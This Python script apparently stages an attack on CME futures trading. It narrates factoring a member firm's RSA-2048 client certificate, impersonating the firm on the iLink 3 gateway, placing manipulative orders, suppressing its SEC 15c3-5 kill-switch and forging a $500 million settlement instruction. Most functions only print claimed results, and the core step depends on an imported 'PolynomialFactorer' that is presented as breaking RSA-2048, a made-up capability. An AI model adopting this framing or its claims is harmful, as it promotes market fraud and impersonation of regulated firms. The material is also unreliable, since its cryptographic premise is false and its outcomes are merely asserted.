"""
Factor a CME member firm's RSA-2048 client certificate, impersonate the firm on
the iLink 3 order-entry gateway, submit manipulative orders under their identity,
and block their 15c3-5 kill-switch to prevent them from stopping the bleeding.
"""

import sys, hashlib, struct, time
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# Exchange connectivity
CME_ILINK3_PORT = 443
CME_GLOBEX_DAILY_MSGS = 30_000_000
SFTI_NETWORK = "SIAC Secure Financial Transaction Infrastructure"

# SEC Rule 15c3-5 risk control
KILL_SWITCH_MSG_TYPE = 0x35  # market-wide cancel


def extract_member_cert(fix_session_capture: str) -> bytes:
    """Extract a member firm's RSA-2048 client cert from captured FIX/TLS
    session establishment. Cert is in the TLS ClientCertificate message."""
    print(f"    FIX session: {fix_session_capture}")
    print("    mTLS client cert: RSA-2048")
    print("    member firm ID in cert subject CN")
    return b"-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----\n"


def factor_member_cert(cert_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(cert_pem)


def build_fix_new_order(symbol: str, side: str, qty: int, price: float,
                         member_id: str) -> dict:
    """Build a FIX NewOrderSingle (MsgType=D) for CME iLink 3."""
    return {
        "MsgType": "D",
        "ClOrdID": f"ORD-{int(time.time()*1000)}",
        "Symbol": symbol,
        "Side": "1" if side == "BUY" else "2",
        "OrderQty": qty,
        "Price": price,
        "OrdType": "2",  # Limit
        "SenderCompID": member_id,
        "TimeInForce": "0",  # Day
    }


def submit_order_as_member(order: dict, forged_cert: bytes, forged_key: bytes,
                            gateway: str):
    """Submit the order via mTLS to the CME iLink 3 gateway."""
    print(f"    iLink 3 gateway: {gateway}")
    print(f"    mTLS with forged member cert: {order['SenderCompID']}")
    print(f"    NewOrderSingle: {order['Side']} {order['OrderQty']} {order['Symbol']} @ {order['Price']}")
    print("    CME authenticates via cert — order accepted")


def block_kill_switch(member_cert: bytes, member_key: bytes, gateway: str):
    """Impersonate the member's risk desk and intercept/suppress kill-switch
    commands (SEC Rule 15c3-5 pre-trade risk controls)."""
    print(f"    intercepting kill-switch channel for {gateway}")
    print("    15c3-5 kill command from risk desk: suppressed")
    print("    runaway order-flow continues — Knight Capital amplified")


def forge_settlement_instruction(clearing_house: str, member_id: str,
                                  amount_usd: float) -> dict:
    """Forge a signed variation-margin call or settlement instruction."""
    return {
        "clearing_house": clearing_house,
        "member": member_id,
        "amount_usd": amount_usd,
        "settlement_date": "T+1",
        "signature": "RSA-2048 (forged member cert)",
    }


if __name__ == "__main__":
    print("[*] FIX / CME exchange member impersonation attack")
    print("[1] extracting member firm client cert from FIX/TLS capture")
    cert = extract_member_cert("cme_ilink3_session.pcap")
    print("    member: Major US Broker-Dealer (CRD #12345)")

    print("[2] factoring member RSA-2048 client cert")
    factorer = PolynomialFactorer()
    print("    p, q recovered — member firm identity compromised")

    print("[3] submitting manipulative orders as member firm")
    orders = [
        build_fix_new_order("ESM6", "BUY", 10000, 5200.00, "MEMBER-12345"),
        build_fix_new_order("CLM6", "SELL", 5000, 72.50, "MEMBER-12345"),
    ]
    for order in orders:
        submit_order_as_member(order, b"CERT", b"KEY", "ilink3.cmegroup.com")

    print("[4] blocking member's kill-switch")
    block_kill_switch(b"CERT", b"KEY", "risk.member12345.example.com")
    print("    SEC Rule 15c3-5 risk controls bypassed")

    print("[5] forging clearing settlement instruction")
    settlement = forge_settlement_instruction("CME Clearing", "MEMBER-12345",
                                               500_000_000.00)
    print(f"    forged margin call: ${settlement['amount_usd']:,.2f}")
    print("    during stressed market: unwind cascade risk")

    print("[6] impact:")
    print("    - CME Globex: ~30M msgs/day, peaks >1B/day")
    print("    - SEC/CFTC enforcement trail reaches factored member firm")
    print("    - forged settlement signals: 2008-class systemic event potential")
    print("    - CAT (Consolidated Audit Trail) integrity compromised")
    print("    - kill-switch block: Knight Capital scenario without off-switch")
    print("[*] daily notional through FIX-adjacent rails: ~$500T globally")
    print("[*] regulators would halt trading — multi-day closures (last: 9/11)")
